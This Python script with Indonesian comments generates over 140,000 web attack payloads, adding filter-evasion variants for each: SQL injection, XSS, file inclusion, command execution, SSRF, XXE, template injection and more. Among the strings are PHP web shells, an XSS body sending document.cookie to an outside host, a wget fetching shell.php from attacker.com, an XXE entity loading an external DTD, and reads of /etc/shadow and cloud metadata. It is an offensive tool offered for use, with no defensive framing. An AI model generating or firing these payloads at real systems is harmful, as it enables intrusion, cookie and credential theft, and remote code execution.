#!/usr/bin/env python3
# ================================================================
# generate_payloads.py - Generator Utama 140.000+ Payload
# ================================================================

import os
import sys
import random
import base64
import urllib.parse

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def save_payloads(filename, payloads):
    with open(os.path.join(PAYLOAD_DIR, filename), "w", encoding="utf-8") as f:
        f.write("\n".join(payloads))
    print(f"[+] {filename}: {len(payloads)} payloads")

def generate_bypass_variants(payload, category):
    variants = [payload]
    # Case randomization
    variants.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
    # Whitespace bypass
    variants.append(payload.replace(' ', '/**/'))
    variants.append(payload.replace(' ', '/*!*/'))
    variants.append(payload.replace(' ', '/**_**/'))
    # Double encoding
    variants.append(urllib.parse.quote(payload))
    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
    return variants

# ================================================================
# 1. SQL Injection
# ================================================================
def generate_sqli():
    p = set()
    prefixes = ["'", "\"", "`", ")", "}", "]", "\\", ""]
    ops = ["OR", "AND", "UNION", "SLEEP", "BENCHMARK"]
    vals = ["1=1", "'1'='1", "1=0", "'1'='2", "x=x", "x=y"]
    suffs = ["--", "#", "/*", ";", "%00", ""]
    for pre in prefixes:
        for op in ops:
            for val in vals:
                for suf in suffs:
                    payload = f"{pre} {op} {val}{suf}"
                    p.update(generate_bypass_variants(payload, 'sqli'))
    for i in range(1, 21):
        cols = ','.join(str(x) for x in range(1, i+1))
        for suf in ["--", "#", "/*", "%00", "%0a", "%0d", "%20", "%09"]:
            p.update(generate_bypass_variants(f"' UNION SELECT {cols}{suf}", 'sqli'))
    bypass = [
        "'OR'1'='1", "'OR'1'='1'--", "'OR'1'='1'#", "'OR'1'='1'/*",
        "'/**/OR/**/1=1--", "'/*!*/OR/*!*/1=1--", "'/*!50000OR*/1=1--",
        "%27OR%271%27%3D%271", "%2527OR%25271%2527%253D%25271",
        "0x274f522731273d2731", "'\tOR\t1=1--", "'\nOR\n1=1--", "'\rOR\r1=1--",
        "'||'1'='1", "'&&'1'='1", "'|'1'='1", "'^'1'='1",
        "' XOR 1=1--", "' XOR 1=0--"
    ]
    for b in bypass:
        p.update(generate_bypass_variants(b, 'sqli'))
    # CONCAT dan hex
    for i in range(1, 10):
        p.add(f"' OR CONCAT({i},{i})={i*11}--")
        p.add(f"' OR CONCAT('a','b')='ab'--")
        p.add(f"' OR CONCAT(0x{random.randint(1,999):x},0x{random.randint(1,999):x})=0x{random.randint(1,9999):x}--")
    hex_payloads = ["0x274f522731273d2731", "0x274f522731273d2731272d2d", "0x27554e494f4e2053454c454354204e554c4c"]
    p.update(hex_payloads)
    while len(p) < 10000:
        base = f"' OR {random.randint(1,999)}={random.randint(1,999)}--"
        p.update(generate_bypass_variants(base, 'sqli'))
    return list(p)[:10000]

# ================================================================
# 2. XSS
# ================================================================
def generate_xss():
    p = set()
    tags = ["script","img","svg","body","div","span","input","iframe","a",
            "marquee","details","button","select","object","embed","math"]
    events = ["onerror","onload","onclick","onmouseover","onfocus","onchange",
              "onstart","ontoggle","onmouseout","onmouseenter","onmouseleave",
              "onkeydown","onkeyup","onkeypress","onsubmit","onreset","onblur",
              "onpointerover","onpointerdown","onpointerup","onauxclick"]
    bodies = ["alert(1)","alert(document.cookie)","alert('XSS')","alert(\"XSS\")",
              "alert(/XSS/)","console.log(1)","console.log(document.cookie)",
              "fetch('http://xss.pt/steal?c='+document.cookie)"]
    for tag in tags:
        for ev in events:
            for body in bodies[:5]:
                payload = f"<{tag} {ev}={body}>"
                p.update(generate_bypass_variants(payload, 'xss'))
    for body in bodies:
        payload = f"<script>{body}</script>"
        p.update(generate_bypass_variants(payload, 'xss'))
    polyglot = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "';alert(1)//","\";alert(1)//",
        "'></script><script>alert(1)</script>",
        "\"></script><script>alert(1)</script>"
    ]
    for b in polyglot:
        p.update(generate_bypass_variants(b, 'xss'))
    while len(p) < 10000:
        base = f"<img src=x onerror=alert({random.randint(1,999)})>"
        p.update(generate_bypass_variants(base, 'xss'))
    return list(p)[:10000]

# ================================================================
# 3. LFI
# ================================================================
def generate_lfi():
    p = set()
    linux = ["/etc/passwd","/etc/shadow","/etc/hosts","/etc/hostname","/etc/issue",
             "/etc/os-release","/etc/debian_version","/etc/redhat-release",
             "/proc/self/environ","/proc/self/cmdline","/proc/self/status",
             "/var/log/apache2/access.log","/var/log/nginx/access.log",
             "/var/log/httpd/access_log","/var/log/messages","/var/log/syslog"]
    prefixes = ["","../../","../../../","../../../../","....//","..\\..\\"]
    for pre in prefixes:
        for path in linux:
            payload = pre + path
            p.update(generate_bypass_variants(payload, 'lfi'))
    windows = ["C:\\windows\\win.ini","C:\\windows\\system32\\drivers\\etc\\hosts",
               "C:\\xampp\\htdocs\\config.php","C:\\wamp\\www\\config.php",
               "C:\\inetpub\\wwwroot\\web.config"]
    for pre in prefixes:
        for path in windows:
            payload = pre + path
            p.update(generate_bypass_variants(payload, 'lfi'))
    bypass = [".././.././etc/passwd","....//....//etc/passwd","..\\..\\..\\..\\windows\\win.ini",
              "../../../../etc/passwd%00","../../../../etc/passwd%2500",
              "..%252f..%252f..%252fetc/passwd"]
    for b in bypass:
        p.update(generate_bypass_variants(b, 'lfi'))
    while len(p) < 10000:
        base = f"../../../../{random.choice(['etc','var','home'])}/{random.choice(['passwd','shadow','hosts'])}"
        p.update(generate_bypass_variants(base, 'lfi'))
    return list(p)[:10000]

# ================================================================
# 4. RCE
# ================================================================
def generate_rce():
    p = set()
    templates = [
        "<?php system($_GET['cmd']); ?>",
        "<?php eval($_POST['cmd']); ?>",
        "<?=shell_exec($_GET['cmd'])?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php include($_GET['file']); ?>"
    ]
    for tmpl in templates:
        p.update(generate_bypass_variants(tmpl, 'rce'))
    separators = [";", "|", "&&", "||", "&", "`", "$(", "|&", ";&", "|;", "\n", "\r"]
    commands = ["id","whoami","uname -a","ls","pwd","cat /etc/passwd","echo HACKED","wget http://attacker.com/shell.php"]
    for sep in separators:
        for cmd in commands:
            base = f"{sep} {cmd}"
            p.update(generate_bypass_variants(base, 'rce'))
    for cmd in commands[:3]:
        encoded = base64.b64encode(cmd.encode()).decode()
        base = f"; echo {encoded} | base64 -d | sh"
        p.update(generate_bypass_variants(base, 'rce'))
    while len(p) < 10000:
        base = f"{random.choice(separators)} {random.choice(commands)}"
        p.update(generate_bypass_variants(base, 'rce'))
    return list(p)[:10000]

# ================================================================
# 5. SSRF
# ================================================================
def generate_ssrf():
    p = set()
    protocols = ["http://","https://","file://","gopher://","dict://"]
    ips = ["127.0.0.1","0.0.0.0","localhost","169.254.169.254"]
    for proto in protocols:
        for ip in ips:
            base = f"{proto}{ip}"
            p.update(generate_bypass_variants(base, 'ssrf'))
    bypass = ["http://127.0.0.1.xip.io","http://localhost.nip.io","http://127.0.0.1@google.com","http://[::1]"]
    for b in bypass:
        p.update(generate_bypass_variants(b, 'ssrf'))
    while len(p) < 10000:
        base = f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        p.update(generate_bypass_variants(base, 'ssrf'))
    return list(p)[:10000]

# ================================================================
# 6. XXE
# ================================================================
def generate_xxe():
    p = set()
    files = ["/etc/passwd","/etc/hosts","/etc/shadow","/var/www/html/config.php","C:/windows/win.ini"]
    for f in files:
        base = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'
        p.update(generate_bypass_variants(base, 'xxe'))
    base = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>'
    p.update(generate_bypass_variants(base, 'xxe'))
    while len(p) < 10000:
        f = random.choice(["/etc/passwd","/etc/hosts","/var/log/syslog"])
        base = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'
        p.update(generate_bypass_variants(base, 'xxe'))
    return list(p)[:10000]

# ================================================================
# 7. NoSQL Injection
# ================================================================
def generate_nosqli():
    p = set()
    ops = ["$ne","$gt","$lt","$in","$or","$and","$nin","$nor","$exists","$regex","$where","$all","$elemMatch","$size","$mod","$type","$not","$eq"]
    fields = ["username","password","email","id","role","token","session"]
    for op in ops:
        for field in fields:
            base = f"{field}[{op}]=admin"
            p.update(generate_bypass_variants(base, 'nosqli'))
    while len(p) < 10000:
        field = random.choice(fields)
        op = random.choice(ops[:5])
        val = random.choice(['admin','user','test'])
        base = f"{field}[{op}]={val}"
        p.update(generate_bypass_variants(base, 'nosqli'))
    return list(p)[:10000]

# ================================================================
# 8. SSTI
# ================================================================
def generate_ssti():
    p = set()
    bases = ["{{ 7*7 }}","{{ config }}","{{ self.__class__.__mro__[1].__subclasses__() }}",
             "<%= 7*7 %>","<%= system(\"id\") %>","${ 7*7 }","${ __import__('os').system('id') }"]
    for b in bases:
        p.update(generate_bypass_variants(b, 'ssti'))
    while len(p) < 10000:
        base = f"{{{{ {random.randint(1,999)}*{random.randint(1,999)} }}}}"
        p.update(generate_bypass_variants(base, 'ssti'))
    return list(p)[:10000]

# ================================================================
# 9. Command Injection
# ================================================================
def generate_cmd_injection():
    p = set()
    separators = [";","|","&&","||","&","`","$("]
    commands = ["id","whoami","uname -a","ls","pwd","cat /etc/passwd"]
    for sep in separators:
        for cmd in commands:
            base = f"{sep} {cmd}"
            p.update(generate_bypass_variants(base, 'cmd_injection'))
    while len(p) < 10000:
        base = f"{random.choice(separators)} {random.choice(commands)}"
        p.update(generate_bypass_variants(base, 'cmd_injection'))
    return list(p)[:10000]

# ================================================================
# 10. LDAP
# ================================================================
def generate_ldap():
    p = set()
    bases = ["*","admin","admin*","*admin","(&(uid=*)(userPassword=*))"]
    for b in bases:
        p.update(generate_bypass_variants(b, 'ldap'))
    while len(p) < 10000:
        base = f"(&(uid={random.choice(['admin','user'])})(userPassword=*))"
        p.update(generate_bypass_variants(base, 'ldap'))
    return list(p)[:10000]

# ================================================================
# 11. Open Redirect
# ================================================================
def generate_open_redirect():
    p = set()
    bases = ["//google.com","https://google.com","http://google.com"]
    for b in bases:
        p.update(generate_bypass_variants(b, 'open_redirect'))
    while len(p) < 10000:
        base = f"//{random.choice(['google','facebook','twitter'])}.com"
        p.update(generate_bypass_variants(base, 'open_redirect'))
    return list(p)[:10000]

# ================================================================
# 12. CSRF
# ================================================================
def generate_csrf():
    p = set()
    bases = ["No CSRF token","Missing CSRF protection"]
    for b in bases:
        p.update(generate_bypass_variants(b, 'csrf'))
    while len(p) < 10000:
        base = f"Missing CSRF token {random.randint(1,999)}"
        p.update(generate_bypass_variants(base, 'csrf'))
    return list(p)[:10000]

# ================================================================
# 13. File Upload
# ================================================================
def generate_file_upload():
    p = set()
    exts = ["php","php5","phtml","asp","aspx","jsp","jspx","py","rb","pl","js","go"]
    for ext in exts:
        bases = [f"shell.{ext}", f"shell.{ext}.jpg", f"shell.gif.{ext}", f"shell.{ext}.png"]
        for b in bases:
            p.update(generate_bypass_variants(b, 'file_upload'))
    while len(p) < 10000:
        base = f"shell.{random.choice(exts)}.{random.choice(['jpg','png','gif'])}"
        p.update(generate_bypass_variants(base, 'file_upload'))
    return list(p)[:10000]

# ================================================================
# 14. Directory Traversal
# ================================================================
def generate_directories():
    p = set()
    bases = ["admin","login","dashboard","panel","cpanel","wp-admin","wp-content",
             "uploads","backup","temp","tmp","test","dev","shell","phpmyadmin",
             "mysql","database","config","conf","htdocs","www","public_html"]
    for b in bases:
        p.update(generate_bypass_variants(b, 'directories'))
    while len(p) < 10000:
        base = f"{random.choice(list(bases))}{random.randint(1,999)}"
        p.update(generate_bypass_variants(base, 'directories'))
    return list(p)[:10000]

# ================================================================
# MAIN
# ================================================================
def main():
    print("[+] GENERATING 140.000+ PAYLOADS...")
    save_payloads("sqli.txt", generate_sqli())
    save_payloads("xss.txt", generate_xss())
    save_payloads("lfi.txt", generate_lfi())
    save_payloads("rce.txt", generate_rce())
    save_payloads("ssrf.txt", generate_ssrf())
    save_payloads("xxe.txt", generate_xxe())
    save_payloads("nosqli.txt", generate_nosqli())
    save_payloads("ssti.txt", generate_ssti())
    save_payloads("cmd_injection.txt", generate_cmd_injection())
    save_payloads("ldap.txt", generate_ldap())
    save_payloads("open_redirect.txt", generate_open_redirect())
    save_payloads("csrf.txt", generate_csrf())
    save_payloads("file_upload.txt", generate_file_upload())
    save_payloads("directories.txt", generate_directories())
    print("[+] ALL PAYLOADS GENERATED SUCCESSFULLY!")

if __name__ == "__main__":
    main()